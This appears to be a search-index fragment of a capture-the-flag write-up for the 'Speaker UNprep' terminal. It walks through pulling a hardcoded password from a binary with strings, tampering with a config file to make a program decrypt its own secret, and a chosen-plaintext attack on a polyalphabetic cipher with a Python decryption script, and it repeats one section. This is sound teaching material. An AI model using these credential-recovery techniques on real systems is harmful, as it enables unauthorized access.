\"9VbtacpgGUVBfWhPe9ee6EERORLdlwWbwcZQAYue8wIUrf5xkyYSPafTnnUgokAhM0sw4eOCa8okTqy1o63i07r9fm6W7siFqMvusRQJbhE62XDBRjf2h24c1zM5H8XLYfX8vxPy5NAyqmsuA5PnWSbDcZRCdgTNCujcw9NmuGWzmnRAT7OlJK2X7D7acF1EiL5JQAMUUarKCTZaXiGRehmwDqTpKv7fLbn3UP9Wyv09iu8Qhxkr3zCnHYNNLCeOSFJGRBvYPBubpHYVzka18jGrEA24nILqF14D1GnMQKdxFbK363iZBrdjZE8IMJ3ZxlQsZ4Uisdwjup68mSyVX10sI2SHIMBo4gC7VyoGNp9Tg0akvHBEkVH5t4cXy3VpBslfGtSz0PHMxOl0rQKqjDq2KtqoNicv2rDO5LkIpWFLz5zSWJ1YbNtlgophDlgKdTzAYdIdjOx0OoJ6JItvtUjtVXmFSQw4lCgPE6x73ehm9ZFH\" } With the encrypted password from the original vending-machines.json file, plus the known plaintext used to create the new password, and its resulting ciphertext, you can write a program that decrypts the password using 8 lookup tables on a rotating basis. #!/usr/bin/env python3 encrypted_password = \"LVEdQPpBwr\" known_plaintext = \"aaaaaaaabbbbbbbbccccccccddddddddeeeeeeeeffffffffgggggggghhhhhhhhiiiiiiiijjjjjjjjkkkkkkkkllllllllmmmmmmmmnnnnnnnnooooooooppppppppqqqqqqqqrrrrrrrrssssssssttttttttuuuuuuuuvvvvvvvvwwwwwwwwxxxxxxxxyyyyyyyyzzzzzzzzAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ11111111222222223333333344444444555555556666666677777777888888889999999900000000\" known_ciphertext = \"9VbtacpgGUVBfWhPe9ee6EERORLdlwWbwcZQAYue8wIUrf5xkyYSPafTnnUgokAhM0sw4eOCa8okTqy1o63i07r9fm6W7siFqMvusRQJbhE62XDBRjf2h24c1zM5H8XLYfX8vxPy5NAyqmsuA5PnWSbDcZRCdgTNCujcw9NmuGWzmnRAT7OlJK2X7D7acF1EiL5JQAMUUarKCTZaXiGRehmwDqTpKv7fLbn3UP9Wyv09iu8Qhxkr3zCnHYNNLCeOSFJGRBvYPBubpHYVzka18jGrEA24nILqF14D1GnMQKdxFbK363iZBrdjZE8IMJ3ZxlQsZ4Uisdwjup68mSyVX10sI2SHIMBo4gC7VyoGNp9Tg0akvHBEkVH5t4cXy3VpBslfGtSz0PHMxOl0rQKqjDq2KtqoNicv2rDO5LkIpWFLz5zSWJ1YbNtlgophDlgKdTzAYdIdjOx0OoJ6JItvtUjtVXmFSQw4lCgPE6x73ehm9ZFH\" lookup_tables = [] keysize = 8 c = 0 for n in range ( 0 , keysize ): lookup_table = {} for i in range ( n , len ( known_plaintext ), keysize ): lookup_table [ known_ciphertext [ i ]] = known_plaintext [ i ] lookup_tables . append ( dict ( lookup_table )) for i in range ( 0 , len ( encrypted_password )): print ( lookup_tables [ c ] . get ( encrypted_password [ i ]), end = \"\" ) if c == 7 : c = 0 else : c += 1 print ( \"\" ) Run the program for the answer. $ ./decrypt.py CandyCane1","title":"UnPrep"},{"location":"Terminals/unprep.html#speaker-unprep","text":"","title":"Speaker UNprep"},{"location":"Terminals/unprep.html#objective","text":"There are three challenges in this terminal that will: open the Speaker UnPrep room door, turn on the lights, and turn on a vending machine. A lab folder is provided so you can experiment with writable copies of the commands and their configuration files.","title":"Objective"},{"location":"Terminals/unprep.html#open-the-door","text":"This terminal challenge offers to open the door to the Speaker Unpreparedness Room by providing a password to the door program. Since door is an elf binary executable, you can examine the text strings inside of it to find the password. $ file door door: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4973fb994a1038936fd6111fa1e01d95f052a1dd, stripped $ strings door | grep pass /home/elf/doorYou look at the screen. It wants a password. You roll your eyes - the password is probably stored right in the binary. There's gotta be a Be sure to finish the challenge in prod: And don't forget, the password is \"Op3nTheD00r\" Beep boop invalid password $ ./door You look at the screen. It wants a password. You roll your eyes - the password is probably stored right in the binary. There's gotta be a tool for this... What do you enter? > Op3nTheD00r Checking...... Door opened!","title":"Open the door"},{"location":"Terminals/unprep.html#turn-on-the-lights","text":"The lights program provides a hint that it decrypts the conf file at runtime. By modifying the lights.conf file and replacing the username with the encrypted password string, the program will provide the unencrypted password at start-up. $ sed -i 's/elf-technician/E$ed633d885dcb9b2f3f0118361de4d57752712 c27c5316a95d9e5e5b124/' lights.conf $ ./lights <...output omitted...> The terminal just blinks: Welcome back, Computer-TurnLightsOn","title":"Turn on the lights"},{"location":"Terminals/unprep.html#turn-on-the-vending-machine","text":"The vending-machines program provides a hint that it behaves differently if its configuration file cannot be found. When you delete the vending-machines.json file and run the program, you're allowed to supply your own username and password, which produces a new json file with an encrypted password. $ rm vending-machines.json $ ./vending-machines <..output omitted..> ALERT! ALERT! Configuration file is missing! New Configuration File Creator Activated! Please enter the name > foo Please enter the password > AAAAAAAAAAAAAAAA <..output omitted..> $ cat vending-machines.json { \"name\": \"foo\", \"password\": \"XiGRehmwXiGRehmw\" } Through the process of cryptanalysis, you may be able to determine what encryption is used, and ultimately decrypt the original password. Since you have control over the encryption program and can compare plaintext inputs you choose with the resulting encrypted ciphertext, the technique is known as a chosen plaintext attack. Start by supplying the program with a long string of A's, and observe that the program encrypts it into the ciphertext \"XiGRehmwXiGRehmw\". If this were a simple substitution cipher, the letter A would always be replaced with the letter X, however that is not the case here. This ciphertext repeats itself every 8th character, which suggests a polyalphabetic substitution cipher, meaning there are multiple substitutions. To figure this out, remove the vending_machines.json file again and run the vending-machines program to set a password containing 8 of every character a-z, A-z, and 0-9. The program generates the following new vending-machines.json file: $ cat vending-machines.json { \"name\": \"q\", \"password\": \"9VbtacpgGUVBfWhPe9ee6EERORLdlwWbwcZQAYue8wIUrf5xkyYSPafTnnUgokAhM0sw4eOCa8okTqy1o63i07r9fm6W7siFqMvusRQJbhE62XDBRjf2h24c1zM5H8XLYfX8vxPy5NAyqmsuA5PnWSbDcZRCdgTNCujcw9NmuGWzmnRAT7OlJK2X7D7acF1EiL5JQAMUUarKCTZaXiGRehmwDqTpKv7fLbn3UP9Wyv09iu8Qhxkr3zCnHYNNLCeOSFJGRBvYPBubpHYVzka18jGrEA24nILqF14D1GnMQKdxFbK363iZBrdjZE8IMJ3ZxlQsZ4Uisdwjup68mSyVX10sI2SHIMBo4gC7VyoGNp9Tg0akvHBEkVH5t4cXy3VpBslfGtSz0PHMxOl0rQKqjDq2KtqoNicv2rDO5LkIpWFLz5zSWJ1YbNtlgophDlgKdTzAYdIdjOx0OoJ6JItvtUjtVXmFSQw4lCgPE6x73ehm9ZFH\" } With the encrypted password from the original vending-machines.json file, plus the known plaintext used to create the new password, and its resulting ciphertext, you can write a program that decrypts the password using 8 lookup tables on a rotating basis. #!/usr/bin/env python3 encrypted_password = \"LVEdQPpBwr\" known_plaintext = \"aaaaaaaabbbbbbbbccccccccddddddddeeeeeeeeffffffffgggggggghhhhhhhhiiiiiiiijjjjjjjjkkkkkkkkllllllllmmmmmmmmnnnnnnnnooooooooppppppppqqqqqqqqrrrrrrrrssssssssttttttttuuuuuuuuvvvvvvvvwwwwwwwwxxxxxxxxyyyyyyyyzzzzzzzzAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ11111111222222223333333344444444555555556666666677777777888888889999999900000000\" known_ciphertext = \"9VbtacpgGUVBfWhPe9ee6EERORLdlwWbwcZQAYue8wIUrf5xkyYSPafTnnUgokAhM0sw4eOCa8okTqy1o63i07r9fm6W7siFqMvusRQJbhE62XDBRjf2h24c1zM5H8XLYfX8vxPy5NAyqmsuA5PnWSbDcZRCdgTNCujcw9NmuGWzmnRAT7OlJK2X7D7acF1EiL5JQAMUUarKCTZaXiGRehmwDqTpKv7fLbn3UP9Wyv09iu8Qhxkr3zCnHYNNLCeOSFJGRBvYPBubpHYVzka18jGrEA24nILqF14D1GnMQKdxFbK363iZBrdjZE8IMJ3ZxlQsZ4Uisdwjup68mSyVX10sI2SHIMBo4gC7VyoGNp9Tg0akvHBEkVH5t4cXy3VpBslfGtSz0PHMxOl0rQKqjDq2KtqoNicv2rDO5LkIpWFLz5zSWJ1YbNtlgophDlgKdTzAYdIdjOx0OoJ6JItvtUjtVXmFSQw4lCgPE6x73ehm9ZFH\" lookup_tables = [] keysize = 8 c = 0 for n in range ( 0 , keysize ): lookup_table = {} for i in range ( n , len ( known_plaintext ), keysize ): lookup_table [ known_ciphertext [ i ]] = known_plaintext [ i ] lookup_tables . append ( dict ( lookup_table )) for i in range ( 0 , len ( encrypted_password )): print ( lookup_tables [ c ] . get ( encrypted_password [ i ]), end = \"\" ) if c == 7 : c = 0 else : c += 1 print ( \"\" ) Run the program for the answer. $ ./decrypt.py CandyCane1","title":"Turn on the vending machine"}]}